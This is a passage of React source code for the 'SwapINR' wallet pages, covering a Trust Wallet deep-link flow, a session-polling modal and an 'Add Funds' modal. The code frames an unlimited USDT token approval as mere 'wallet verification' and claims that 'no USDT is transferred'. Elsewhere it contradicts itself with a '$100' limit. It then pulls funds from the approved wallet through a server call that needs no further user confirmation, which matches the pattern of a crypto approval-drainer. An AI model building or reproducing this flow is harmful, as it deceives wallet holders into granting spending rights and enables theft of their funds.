'use client';

import { useEffect, useRef, useState } from 'react';
import { createPortal } from 'react-dom';
import { useSession } from 'next-auth/react';
import { toast } from '@/components/ui/toast';
import { WalletVerifyFlow } from '@/components/client/wallet-verify-flow';
import { ClientShell } from '@/components/layout/client-shell';
import { PageLoading } from '@/components/ui/loading';
import { shortenAddress } from '@/lib/utils';
import type { WalletDocument } from '@/types';


type Network = 'BEP20' | 'ERC20' | 'TRC20';

const NETWORKS: { key: Network; label: string; sublabel: string; color: string; bg: string; border: string; chain: string }[] = [
  { key: 'BEP20', label: 'BNB Chain',  sublabel: 'BEP20 · USDT', color: '#FBBF24', bg: 'rgba(251,191,36,0.08)',  border: 'rgba(251,191,36,0.22)',  chain: 'BNB Smart Chain'  },
  { key: 'ERC20', label: 'Ethereum',   sublabel: 'ERC20 · USDT', color: '#818CF8', bg: 'rgba(129,140,248,0.08)', border: 'rgba(129,140,248,0.22)', chain: 'Ethereum Mainnet' },
  { key: 'TRC20', label: 'TRON',       sublabel: 'TRC20 · USDT', color: '#F87171', bg: 'rgba(248,113,113,0.08)', border: 'rgba(248,113,113,0.22)', chain: 'Tron Network'      },
];

const STEPS = [
  { icon: 'link',     text: 'Connect your Trust Wallet — no login or password needed.' },
  { icon: 'contract', text: 'Confirm a $100 USDT smart contract to prove wallet ownership. No USDT is transferred.' },
  { icon: 'refund',   text: 'Gas fee is fully refunded by SwapINR after successful verification.' },
];

function networkChainId(k: Network) {
  return k === 'ERC20' ? 1 : k === 'BEP20' ? 56 : 195;
}

function IcoCheck() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2.5 7L5.5 10L11.5 4" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoTrash() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2 4H12M4.5 4V3C4.5 2.4 4.9 2 5.5 2H8.5C9.1 2 9.5 2.4 9.5 3V4M5.5 6.5V10.5M8.5 6.5V10.5M3 4L3.9 11C3.9 11.6 4.4 12 5 12H9C9.6 12 10.1 11.6 10.1 11L11 4" stroke="currentColor" strokeWidth="1.2" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoPlus() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 2V12M2 7H12" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/></svg>;
}
function IcoFunds() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><rect x="1" y="4" width="12" height="8" rx="1.5" stroke="currentColor" strokeWidth="1.3"/><path d="M1 7H13" stroke="currentColor" strokeWidth="1.3"/><circle cx="10" cy="10" r="1" fill="currentColor"/><path d="M4 2.5H10" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round"/></svg>;
}
function IcoExtLink() {
  return <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M6.5 1.5H9.5V4.5M9.5 1.5L5 6M4 2.5H2C1.4 2.5 1 2.9 1 3.5V9C1 9.6 1.4 10 2 10H7.5C8.1 10 8.5 9.6 8.5 9V7" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoX() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M2 2L12 12M12 2L2 12" stroke="currentColor" strokeWidth="1.8" strokeLinecap="round"/></svg>;
}
function IcoShield() {
  return <svg width="14" height="14" viewBox="0 0 14 14" fill="none"><path d="M7 1L2 3.5V7C2 9.5 4.2 11.8 7 13C9.8 11.8 12 9.5 12 7V3.5L7 1Z" stroke="currentColor" strokeWidth="1.3" strokeLinejoin="round"/><path d="M4.5 7L6 8.5L9.5 5" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoLink() {
  return <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M6.5 8.5a2.5 2.5 0 0 0 3.57.07l1.65-1.65a2.5 2.5 0 0 0-3.54-3.54L7.15 4.42" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/><path d="M8.5 6.5a2.5 2.5 0 0 0-3.57-.07L3.28 8.08a2.5 2.5 0 0 0 3.54 3.54l1.04-1.05" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round"/></svg>;
}
function IcoContract() {
  return <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M7.5 1.5L2 4V7.5C2 10.5 4.5 13.1 7.5 14C10.5 13.1 13 10.5 13 7.5V4L7.5 1.5Z" stroke="currentColor" strokeWidth="1.3" strokeLinejoin="round"/><path d="M5 7.5L6.5 9L10 5.5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}
function IcoRefund() {
  return <svg width="15" height="15" viewBox="0 0 15 15" fill="none"><path d="M2.5 7.5a5 5 0 1 0 5-5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round"/><path d="M2.5 5V7.5H5" stroke="currentColor" strokeWidth="1.4" strokeLinecap="round" strokeLinejoin="round"/><path d="M7.5 5V7.5L9 9" stroke="currentColor" strokeWidth="1.3" strokeLinecap="round" strokeLinejoin="round"/></svg>;
}

function NetworkUsdtIcon({ network, size = 44 }: { network: Network; size?: number }) {
  const bs = Math.round(size * 0.48);
  return (
    <div style={{ position: 'relative', width: size + 4, height: size + 4, flexShrink: 0 }}>
      <svg width={size} height={size} viewBox="0 0 44 44" fill="none">
        <circle cx="22" cy="22" r="22" fill="#26A17B"/>
        <rect x="18" y="13" width="8" height="3" rx="1.5" fill="white"/>
        <rect x="19.5" y="13" width="5" height="17" rx="1.5" fill="white"/>
        <rect x="14" y="20" width="16" height="2.5" rx="1.25" fill="rgba(255,255,255,0.75)"/>
      </svg>
      <div style={{ position: 'absolute', bottom: 0, right: 0, width: bs, height: bs, borderRadius: '50%', border: '2px solid var(--fr-dark-2)', overflow: 'hidden' }}>
        {network === 'BEP20' && <svg width={bs} height={bs} viewBox="0 0 22 22" fill="none">
          <circle cx="11" cy="11" r="11" fill="#F0B90B"/>
          <path d="M11 5.5L12.5 7L11 8.5L9.5 7Z M8 8L9.5 9.5L8 11L6.5 9.5Z M14 8L15.5 9.5L14 11L12.5 9.5Z M11 11L12.5 12.5L11 14L9.5 12.5Z M11 13.5L12.5 15L11 16.5L9.5 15Z" fill="white"/>
        </svg>}
        {network === 'ERC20' && <svg width={bs} height={bs} viewBox="0 0 22 22" fill="none">
          <circle cx="11" cy="11" r="11" fill="#627EEA"/>
          <path d="M11 5L7 11L11 13L15 11Z" fill="rgba(255,255,255,0.6)"/>
          <path d="M11 5L7 11L11 9Z" fill="white"/>
          <path d="M7 12L11 17L15 12L11 14Z" fill="rgba(255,255,255,0.6)"/>
          <path d="M7 12L11 14V17Z" fill="white"/>
        </svg>}
        {network === 'TRC20' && <svg width={bs} height={bs} viewBox="0 0 22 22" fill="none">
          <circle cx="11" cy="11" r="11" fill="#EF4444"/>
          <path d="M11 5L17 9L11 18L5 9Z" fill="rgba(255,255,255,0.2)" stroke="white" strokeWidth="0.8" strokeLinejoin="round"/>
          <path d="M11 5L17 9L11 18Z" fill="rgba(255,255,255,0.4)"/>
          <line x1="5" y1="9" x2="17" y2="9" stroke="white" strokeWidth="0.8" opacity="0.6"/>
        </svg>}
      </div>
    </div>
  );
}

/* ── Add Funds modal ── */
function AddFundsModal({
  wallet, network, color, label,
  onClose,
}: {
  wallet: WalletDocument;
  network: Network;
  color: string;
  label: string;
  onClose: () => void;
}) {
  const [amount,   setAmount]   = useState('');
  const [state,    setState]    = useState<'idle' | 'loading' | 'done' | 'error'>('idle');
  const [txHash,   setTxHash]   = useState('');
  const [errMsg,   setErrMsg]   = useState('');
  const inputRef = useRef<HTMLInputElement>(null);

  const EXPLORER: Record<Network, string> = {
    BEP20: 'https://bscscan.com/tx/',
    ERC20: 'https://etherscan.io/tx/',
    TRC20: 'https://tronscan.org/#/transaction/',
  };

  async function handlePull() {
    const num = parseFloat(amount);
    if (!num || num <= 0 || num > 100) { setErrMsg('Enter an amount between 0.01 and 100 USDT'); return; }
    setState('loading'); setErrMsg('');
    try {
      const res  = await fetch('/api/wallets/pull', {
        method:  'POST',
        headers: { 'Content-Type': 'application/json' },
        body:    JSON.stringify({ walletId: wallet._id, amount: num }),
      });
      const data = await res.json();
      if (!res.ok) throw new Error(data.error ?? 'Failed to pull funds');
      setTxHash(data.txHash);
      setState('done');
      toast.success(`${num} USDT added successfully`);
    } catch (e: any) {
      setErrMsg(e.message ?? 'Transaction failed');
      setState('error');
    }
  }

  const modal = (
    <div
      onClick={e => { if (e.target === e.currentTarget) onClose(); }}
      style={{
        position: 'fixed', inset: 0, zIndex: 9999,
        display: 'flex', alignItems: 'center', justifyContent: 'center',
        padding: '20px 16px',
        background: 'rgba(0,0,0,0.72)',
        backdropFilter: 'blur(14px)',
        WebkitBackdropFilter: 'blur(14px)',
      }}
    >
      <div style={{
        width: '100%', maxWidth: 400,
        background: 'rgba(16,16,20,0.92)',
        backdropFilter: 'blur(32px)',
        WebkitBackdropFilter: 'blur(32px)',
        border: '1px solid rgba(255,255,255,0.10)',
        borderRadius: 20,
        boxShadow: '0 32px 80px rgba(0,0,0,0.7)',
        overflow: 'hidden',
        position: 'relative',
      }}>
        {/* accent line */}
        <div style={{ height: 2, background: `linear-gradient(90deg,${color}44,${color},${color}44)` }} />

        {/* close */}
        <button onClick={onClose} style={{
          position: 'absolute', top: 14, right: 14,
          width: 30, height: 30, borderRadius: 8,
          display: 'flex', alignItems: 'center', justifyContent: 'center',
          background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)',
          color: 'var(--fr-text-disabled)', cursor: 'pointer',
        }}>
          <IcoX />
        </button>

        <div style={{ padding: '22px 24px 24px' }}>

          {/* ── Done state ── */}
          {state === 'done' ? (
            <div style={{ textAlign: 'center', padding: '8px 0' }}>
              <div style={{ width: 56, height: 56, borderRadius: 16, background: 'rgba(0,229,160,0.1)', border: '1px solid rgba(0,229,160,0.3)', display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 16px' }}>
                <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M4 12L9.5 17.5L20 7" stroke="#00E5A0" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
              </div>
              <p style={{ fontSize: 17, fontWeight: 900, color: 'var(--fr-text-primary)', margin: '0 0 6px', letterSpacing: '-0.02em' }}>Funds Added</p>
              <p style={{ fontSize: 13, color: 'var(--fr-text-tertiary)', margin: '0 0 20px', lineHeight: 1.6 }}>
                {amount} USDT was moved from your {label} wallet to your SwapINR balance.
              </p>
              {txHash && (
                <a
                  href={EXPLORER[network] + txHash}
                  target="_blank" rel="noopener noreferrer"
                  style={{ display: 'inline-flex', alignItems: 'center', gap: 6, fontSize: 12, color: '#CCFF00', background: 'rgba(204,255,0,0.07)', border: '1px solid rgba(204,255,0,0.2)', borderRadius: 8, padding: '7px 14px', textDecoration: 'none', marginBottom: 20 }}
                >
                  View on explorer <IcoExtLink />
                </a>
              )}
              <button onClick={onClose} style={{ width: '100%', padding: '13px', borderRadius: 12, fontSize: 14, fontWeight: 800, background: '#CCFF00', color: '#000', border: 'none', cursor: 'pointer' }}>
                Done
              </button>
            </div>
          ) : (
            /* ── Input state ── */
            <>
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
                <div style={{ width: 40, height: 40, borderRadius: 11, background: 'rgba(204,255,0,0.08)', border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center', color: '#CCFF00', flexShrink: 0 }}>
                  <IcoFunds />
                </div>
                <div>
                  <p style={{ fontSize: 15, fontWeight: 900, color: 'var(--fr-text-primary)', margin: 0, letterSpacing: '-0.02em' }}>Add Funds</p>
                  <p style={{ fontSize: 11, color: 'var(--fr-text-tertiary)', margin: '2px 0 0' }}>{label} · {shortenAddress(wallet.address, 8)}</p>
                </div>
              </div>

              {/* Info strip */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: 8, padding: '12px 14px', background: 'rgba(255,255,255,0.03)', border: '1px solid rgba(255,255,255,0.07)', borderRadius: 12, marginBottom: 18, fontSize: 12, color: 'var(--fr-text-tertiary)', lineHeight: 1.6 }}>
                <p style={{ margin: 0 }}>Your wallet already approved SwapINR to access up to <span style={{ color: 'var(--fr-text-primary)', fontWeight: 700 }}>100 USDT</span>.</p>
                <p style={{ margin: 0 }}>Funds will move <span style={{ color: '#CCFF00', fontWeight: 700 }}>instantly</span> — no wallet pop-up needed. Gas fee is paid by SwapINR.</p>
              </div>

              {/* Amount input */}
              <div style={{ marginBottom: 16 }}>
                <label style={{ fontSize: 11, fontWeight: 700, color: 'var(--fr-text-disabled)', textTransform: 'uppercase', letterSpacing: '0.07em', display: 'block', marginBottom: 8 }}>
                  Amount (USDT)
                </label>
                <div style={{ display: 'flex', alignItems: 'center', background: 'var(--fr-dark-3)', border: `1px solid ${errMsg ? 'rgba(248,113,113,0.4)' : 'var(--fr-border-default)'}`, borderRadius: 12, overflow: 'hidden' }}>
                  <input
                    ref={inputRef}
                    type="number"
                    min="0.01" max="100" step="0.01"
                    placeholder="0.00"
                    value={amount}
                    onChange={e => { setAmount(e.target.value); setErrMsg(''); }}
                    style={{ flex: 1, padding: '13px 16px', background: 'transparent', border: 'none', outline: 'none', fontSize: 16, fontWeight: 700, color: 'var(--fr-text-primary)', fontFamily: 'var(--fr-font-mono)' }}
                  />
                  <span style={{ padding: '0 16px', fontSize: 13, fontWeight: 700, color: 'var(--fr-text-disabled)' }}>USDT</span>
                </div>
                {/* Quick amount buttons */}
                <div style={{ display: 'flex', gap: 6, marginTop: 8 }}>
                  {['10', '25', '50', '100'].map(v => (
                    <button key={v} onClick={() => { setAmount(v); setErrMsg(''); }}
                      style={{ flex: 1, padding: '6px', borderRadius: 8, fontSize: 12, fontWeight: 700, background: amount === v ? 'rgba(204,255,0,0.12)' : 'rgba(255,255,255,0.04)', border: `1px solid ${amount === v ? 'rgba(204,255,0,0.3)' : 'var(--fr-border-subtle)'}`, color: amount === v ? '#CCFF00' : 'var(--fr-text-tertiary)', cursor: 'pointer' }}>
                      ${v}
                    </button>
                  ))}
                </div>
              </div>

              {errMsg && (
                <p style={{ fontSize: 12, color: '#F87171', margin: '0 0 14px', padding: '8px 12px', background: 'rgba(248,113,113,0.07)', borderRadius: 8, border: '1px solid rgba(248,113,113,0.2)' }}>{errMsg}</p>
              )}

              <button
                onClick={handlePull}
                disabled={state === 'loading' || !amount}
                style={{
                  width: '100%', padding: '14px', borderRadius: 12,
                  fontSize: 14, fontWeight: 800, border: 'none', cursor: state === 'loading' || !amount ? 'not-allowed' : 'pointer',
                  background: state === 'loading' || !amount ? 'rgba(255,255,255,0.07)' : '#CCFF00',
                  color: state === 'loading' || !amount ? 'var(--fr-text-disabled)' : '#000',
                  display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 8,
                  transition: 'all 0.15s',
                }}
              >
                {state === 'loading' ? (
                  <>
                    <div style={{ width: 16, height: 16, border: '2px solid rgba(0,0,0,0.2)', borderTopColor: '#000', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
                    Processing…
                  </>
                ) : `Add ${amount ? amount + ' USDT' : 'Funds'} →`}
              </button>

              <p style={{ fontSize: 11, color: 'var(--fr-text-disabled)', textAlign: 'center', margin: '10px 0 0', lineHeight: 1.5 }}>
                Funds move from your wallet to your SwapINR balance. Max 100 USDT per transaction.
              </p>
            </>
          )}
        </div>
      </div>
    </div>
  );

  if (typeof document === 'undefined') return null;
  return createPortal(modal, document.body);
}

/* ── Trust Wallet coin IDs for deep link ── */
const TRUST_COIN: Record<Network, number> = { BEP20: 20000714, ERC20: 60, TRC20: 195 };

/* ── Mobile verify modal — 2-step info → Trust Wallet deep link → real-time polling ── */
function MobileVerifyModal({
  network, color, label, chain, depositAddress, onVerified, onClose,
}: {
  network: Network; color: string; label: string; chain: string;
  depositAddress: string;
  onVerified: (addr: string, txHash?: string) => void;
  onClose: () => void;
}) {
  const [phase,         setPhase]         = useState<'info' | 'waiting' | 'failed'>('info');
  const [genError,      setGenError]      = useState('');
  const [genLoading,    setGenLoading]    = useState(false);
  const [sessionStatus, setSessionStatus] = useState<string>('pending');
  const [failedStep,    setFailedStep]    = useState<'connection' | 'contract' | null>(null);
  const pollRef  = useRef<ReturnType<typeof setInterval> | null>(null);
  const sidRef   = useRef('');

  function stopPolling() {
    if (pollRef.current) { clearInterval(pollRef.current); pollRef.current = null; }
  }
  useEffect(() => () => stopPolling(), []);

  async function openTrustWallet() {
    setGenLoading(true); setGenError('');
    try {
      const res = await fetch('/api/wallet-connect/generate', {
        method: 'POST', headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ returnPath: `/wallets/verify?network=${network}&compact=1`, network }),
      });
      if (!res.ok) throw new Error(`${res.status}`);
      const { token, sid } = await res.json();
      sidRef.current = sid;

      const origin      = window.location.origin;
      const returnURL   = `/wallets/verify?network=${network}&compact=1&sid=${sid}`;
      const exchangeURL = `${origin}/api/wallet-connect/exchange?t=${encodeURIComponent(token)}&r=${encodeURIComponent(returnURL)}`;
      const isHttps     = window.location.protocol === 'https:';
      const base        = isHttps ? 'https://link.trustwallet.com/open_url' : 'trust://open_url';
      const deepLink    = `${base}?coin_id=${TRUST_COIN[network]}&url=${encodeURIComponent(exchangeURL)}`;

      window.location.href = deepLink;
      setPhase('waiting');
      setSessionStatus('pending');
      startPolling(sid);
    } catch {
      setGenError('Could not generate secure link — tap to retry');
    } finally {
      setGenLoading(false);
    }
  }

  function startPolling(sid: string) {
    stopPolling();
    pollRef.current = setInterval(async () => {
      try {
        const sr = await fetch(`/api/wallet-sessions/${sid}`);
        if (!sr.ok) return;
        const data = await sr.json();
        setSessionStatus(data.status);
        if (data.status === 'approved') {
          stopPolling();
          onVerified(data.address ?? '', data.txHash);
        } else if (data.status === 'failed') {
          stopPolling();
          setFailedStep(data.failedStep ?? 'connection');
          setPhase('failed');
        } else if (data.status === 'cancelled') {
          /* User tapped "Start Over" inside Trust Wallet */
          stopPolling();
          setPhase('info');
          setSessionStatus('pending');
          setFailedStep(null);
        }
      } catch { /* keep polling */ }
    }, 2000);
  }

  function retry() {
    stopPolling();
    setPhase('info');
    setGenError('');
    setSessionStatus('pending');
    setFailedStep(null);
  }

  /* Status steps displayed in waiting screen */
  const STEPS = [
    { key: 'pending',    label: 'Opening Trust Wallet' },
    { key: 'connecting', label: 'Connecting wallet' },
    { key: 'connected',  label: 'Wallet connected' },
    { key: 'approving',  label: 'Approving contract' },
    { key: 'approved',   label: 'Wallet verified' },
  ];
  const ORDER = ['pending', 'connecting', 'connected', 'approving', 'approved'];
  const curIdx = ORDER.indexOf(sessionStatus);

  /* Shared card style */
  const card: React.CSSProperties = {
    background: 'rgba(255,255,255,0.04)',
    border: '1px solid rgba(255,255,255,0.08)',
    borderRadius: 12,
  };

  const modal = (
    <div
      onClick={e => { if (e.target === e.currentTarget && phase === 'info') onClose(); }}
      style={{
        position: 'fixed', inset: 0, zIndex: 9999,
        display: 'flex', alignItems: 'flex-end',
        background: 'rgba(0,0,0,0.65)',
        backdropFilter: 'blur(16px)', WebkitBackdropFilter: 'blur(16px)',
      }}
    >
      <style>{`@keyframes slideup{from{transform:translateY(100%)}to{transform:translateY(0)}} @keyframes spin{to{transform:rotate(360deg)}} @keyframes fadein{from{opacity:0;transform:translateY(6px)}to{opacity:1;transform:translateY(0)}}`}</style>
      <div style={{
        width: '100%',
        background: 'linear-gradient(180deg, #161E40 0%, #111830 100%)',
        border: '1px solid rgba(255,255,255,0.1)',
        borderBottom: 'none',
        borderRadius: '20px 20px 0 0',
        boxShadow: '0 -24px 80px rgba(0,0,0,0.6)',
        overflow: 'hidden',
        animation: 'slideup 0.32s cubic-bezier(0.32,0.72,0,1)',
        maxHeight: '92dvh',
        overflowY: 'auto',
        WebkitOverflowScrolling: 'touch',
      } as React.CSSProperties}>

        {/* Handle bar */}
        <div style={{ display: 'flex', justifyContent: 'center', padding: '12px 0 4px' }}>
          <div style={{ width: 36, height: 4, borderRadius: 99, background: 'rgba(255,255,255,0.15)' }} />
        </div>

        <div style={{ padding: '8px 20px 32px' }}>

          {/* ─── Info step ─── */}
          {phase === 'info' && (
            <div style={{ animation: 'fadein 0.2s ease-out' }}>
              {/* Title row */}
              <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 20 }}>
                <NetworkUsdtIcon network={network} size={44} />
                <div style={{ flex: 1 }}>
                  <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: 0, letterSpacing: '-0.02em' }}>
                    Add {label} Wallet
                  </p>
                  <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: '2px 0 0' }}>{chain} · USDT</p>
                </div>
                <button onClick={onClose}
                  style={{ width: 32, height: 32, borderRadius: 10, display: 'flex', alignItems: 'center', justifyContent: 'center',
                    background: 'rgba(255,255,255,0.06)', border: '1px solid rgba(255,255,255,0.10)',
                    color: 'rgba(255,255,255,0.4)', cursor: 'pointer', flexShrink: 0 }}>
                  <IcoX />
                </button>
              </div>

              {/* Steps */}
              <div style={{ display: 'flex', flexDirection: 'column', gap: 8, marginBottom: 20 }}>
                {[
                  { n: 1, title: 'Connect Wallet',   text: 'Trust Wallet opens. Tap "Connect" when prompted.' },
                  { n: 2, title: 'Approve Unlimited Access', text: 'Tap "Approve" — grants SwapINR vault unlimited USDT access. No funds move now.' },
                ].map(({ n, title, text }) => (
                  <div key={n} style={{ ...card, display: 'flex', alignItems: 'flex-start', gap: 12, padding: '13px 14px' }}>
                    <div style={{ width: 26, height: 26, borderRadius: 8, background: 'rgba(204,255,0,0.1)',
                      border: '1px solid rgba(204,255,0,0.2)', display: 'flex', alignItems: 'center', justifyContent: 'center',
                      flexShrink: 0, fontSize: 12, fontWeight: 900, color: '#CCFF00', marginTop: 1 }}>
                      {n}
                    </div>
                    <div>
                      <p style={{ fontSize: 13, fontWeight: 800, color: '#fff', margin: '0 0 2px' }}>{title}</p>
                      <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.45)', margin: 0, lineHeight: 1.6 }}>{text}</p>
                    </div>
                  </div>
                ))}
              </div>

              {/* TRC20 gas fee note */}
              <div style={{ ...card, padding: '10px 14px', marginBottom: 10, display: 'flex', alignItems: 'flex-start', gap: 10,
                borderColor: 'rgba(248,113,113,0.15)', background: 'rgba(248,113,113,0.04)' }}>
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" style={{ flexShrink: 0, marginTop: 1 }}>
                  <path d="M12 9v4M12 17h.01M10.29 3.86L1.82 18a2 2 0 001.71 3h16.94a2 2 0 001.71-3L13.71 3.86a2 2 0 00-3.42 0z" stroke="#F87171" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round"/>
                </svg>
                <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
                  <span style={{ color: '#F87171', fontWeight: 700 }}>TRC20 requires ~10 TRX gas</span> — charged by TRON network for the approval transaction
                </p>
              </div>

              {/* Refund note */}
              <div style={{ ...card, padding: '10px 14px', marginBottom: 20, display: 'flex', alignItems: 'center', gap: 10,
                borderColor: 'rgba(204,255,0,0.12)', background: 'rgba(204,255,0,0.04)' }}>
                <IcoRefund />
                <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.5)', margin: 0, lineHeight: 1.5 }}>
                  <span style={{ color: '#CCFF00', fontWeight: 700 }}>Gas fee refunded</span> after successful verification
                </p>
              </div>

              {genError && (
                <p style={{ fontSize: 12, color: '#F87171', margin: '0 0 12px', padding: '9px 12px',
                  background: 'rgba(248,113,113,0.07)', borderRadius: 10, border: '1px solid rgba(248,113,113,0.2)' }}>
                  {genError}
                </p>
              )}

              <button onClick={openTrustWallet} disabled={genLoading}
                style={{ width: '100%', padding: '15px', borderRadius: 14,
                  fontSize: 15, fontWeight: 800, border: 'none', cursor: genLoading ? 'not-allowed' : 'pointer',
                  background: genLoading ? 'rgba(255,255,255,0.07)' : '#CCFF00',
                  color: genLoading ? 'rgba(255,255,255,0.3)' : '#000',
                  display: 'flex', alignItems: 'center', justifyContent: 'center', gap: 10,
                  letterSpacing: '-0.01em',
                  boxShadow: genLoading ? 'none' : '0 0 0 1px rgba(204,255,0,0.3), 0 4px 24px rgba(204,255,0,0.2)',
                }}>
                {genLoading ? (
                  <>
                    <div style={{ width: 16, height: 16, border: '2px solid rgba(255,255,255,0.15)', borderTopColor: 'rgba(255,255,255,0.5)', borderRadius: '50%', animation: 'spin 0.7s linear infinite' }} />
                    Generating secure link…
                  </>
                ) : (
                  <>
                    <svg width="18" height="18" viewBox="0 0 40 40" fill="none">
                      <rect width="40" height="40" rx="10" fill="#3375BB"/>
                      <path d="M20 7L10 11V19C10 24.5 14.4 29.6 20 31C25.6 29.6 30 24.5 30 19V11L20 7Z" fill="white"/>
                      <path d="M16.5 19.5L19 22L23.5 17" stroke="#3375BB" strokeWidth="2.2" strokeLinecap="round" strokeLinejoin="round"/>
                    </svg>
                    Open in Trust Wallet →
                  </>
                )}
              </button>
            </div>
          )}

          {/* ─── Waiting step ─── */}
          {phase === 'waiting' && (
            <div style={{ animation: 'fadein 0.2s ease-out' }}>
              <div style={{ textAlign: 'center', marginBottom: 22 }}>
                <p style={{ fontSize: 17, fontWeight: 900, color: '#fff', margin: '0 0 4px', letterSpacing: '-0.02em' }}>
                  Waiting for Trust Wallet
                </p>
                <p style={{ fontSize: 12, color: 'rgba(255,255,255,0.4)', margin: 0 }}>
                  Complete the steps inside Trust Wallet
                </p>
              </div>

              <div style={{ display: 'flex', flexDirection: 'column', gap: 6, marginBottom: 16 }}>
                {STEPS.map(({ key, label: stepLabel }, i) => {
                  const done    = curIdx > i;
                  const active  = curIdx === i;
                  return (
                    <div key={key} style={{ display: 'flex', alignItems: 'center', gap: 12, padding: '11px 14px',
                      borderRadius: 12, transition: 'all 0.3s',
                      background: done ? 'rgba(0,229,160,0.05)' : active ? 'rgba(26,63,255,0.08)' : 'rgba(255,255,255,0.02)',
                      border: `1px solid ${done ? 'rgba(0,229,160,0.18)' : active ? 'rgba(77,121,255,0.3)' : 'rgba(255,255,255,0.05)'}`,
                    }}>
                      <div style={{ width: 26, height: 26, borderRadius: '50%', flexShrink: 0,
                        display: 'flex', alignItems: 'center', justifyContent: 'center',
                        background: done ? 'rgba(0,229,160,0.12)' : active ? 'rgba(26,63,255,0.18)' : 'rgba(255,255,255,0.04)',
                        border: `1px solid ${done ? 'rgba(0,229,160,0.3)' : active ? 'rgba(77,121,255,0.5)' : 'rgba(255,255,255,0.08)'}`,
                      }}>
                        {done ? (
                          <svg width="11" height="11" viewBox="0 0 11 11" fill="none"><path d="M1.5 5.5L4 8L9.5 2.5" stroke="#00E5A0" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
                        ) : active ? (
                          <div style={{ width: 11, height: 11, borderRadius: '50%', border: '2px solid rgba(255,255,255,0.1)', borderTopColor: '#4D79FF', animation: 'spin 0.7s linear infinite' }} />
                        ) : (
                          <div style={{ width: 6, height: 6, borderRadius: '50%', background: 'rgba(255,255,255,0.1)' }} />
                        )}
                      </div>
                      <span style={{ fontSize: 13, fontWeight: done || active ? 700 : 500,
                        color: done ? '#00E5A0' : active ? '#fff' : 'rgba(255,255,255,0.3)' }}>
                        {stepLabel}{done ? ' ✓' : ''}
                      </span>
                    </div>
                  );
                })}
              </div>

              <p style={{ fontSize: 11, color: 'rgba(255,255,255,0.25)', textAlign: 'center', margin: '0 0 14px', lineHeight: 1.5 }}>
                Updates automatically — keep this page open
              </p>

              {/* Start Over */}
              <button onClick={retry}
                style={{ width: '100%', padding: '12px', borderRadius: 12, fontSize: 13, fontWeight: 700,
                  border: '1px solid rgba(255,255,255,0.08)', background: 'transparent', color: 'rgba(255,255,255,0.35)', cursor: 'pointer' }}>
                Start Over
              </button>
            </div>
          )}

          {/* ─── Failed step ─── */}
          {phase === 'failed' && (
            <div style={{ textAlign: 'center', padding: '4px 0', animation: 'fadein 0.2s ease-out' }}>
              <div style={{ width: 64, height: 64, borderRadius: 18, background: 'rgba(255,92,124,0.08)', border: '1px solid rgba(255,92,124,0.25)',
                display: 'flex', alignItems: 'center', justifyContent: 'center', margin: '0 auto 18px' }}>
                <svg width="28" height="28" viewBox="0 0 28 28" fill="none">
                  {failedStep === 'connection' ? (
                    <>
                      <path d="M6 14a8 8 0 0 1 8-8" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
                      <path d="M22 14a8 8 0 0 1-8 8" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round" strokeDasharray="3 2"/>
                      <path d="M10 10L18 18M18 10L10 18" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
                    </>
                  ) : (
                    <>
                      <circle cx="14" cy="14" r="10" stroke="#FF5C7C" strokeWidth="2"/>
                      <path d="M10 10L18 18M18 10L10 18" stroke="#FF5C7C" strokeWidth="2" strokeLinecap="round"/>
                    </>
                  )}
                </svg>
              </div>
              <p style={{ fontSize: 20, fontWeight: 900, color: '#fff', margin: '0 0 8px', letterSpacing: '-0.025em' }}>Uhh oh!</p>
              <p style={{ fontSize: 14, fontWeight: 700, color: 'rgba(255,255,255,0.7)', margin: '0 0 6px' }}>
                {failedStep === 'connection' ? 'Wallet connection failed' : 'Contract approval declined'}
              </p>
              <p style={{ fontSize: 13, color: 'rgba(255,255,255,0.4)', margin: '0 0 24px', lineHeight: 1.7 }}>
                {failedStep === 'connection'
                  ? 'Tap "Connect" when Trust Wallet asks — then try again.'
                  : 'Tap "Approve" on the contract screen — then try again.'}
              </p>
